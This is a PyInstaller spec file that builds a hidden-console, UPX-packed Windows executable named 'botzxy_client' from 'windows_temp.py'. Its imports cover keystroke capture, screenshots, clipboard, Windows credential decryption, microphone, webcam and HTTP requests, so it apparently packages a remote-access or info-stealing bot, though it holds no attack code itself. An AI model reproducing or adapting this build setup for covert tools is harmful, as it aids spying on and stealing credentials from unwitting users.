# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['windows_temp.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=['keyboard', 'pyautogui', 'win32clipboard', 'win32api', 'win32con', 'win32process', 'win32cred', 'win32crypt', 'win32com', 'win32com.client', 'psutil', 'pyaudio', 'cryptography', 'pyttsx3', 'sqlite3', 'cv2', 'numpy', 'PIL', 'requests', 'ctypes'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='botzxy_client',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
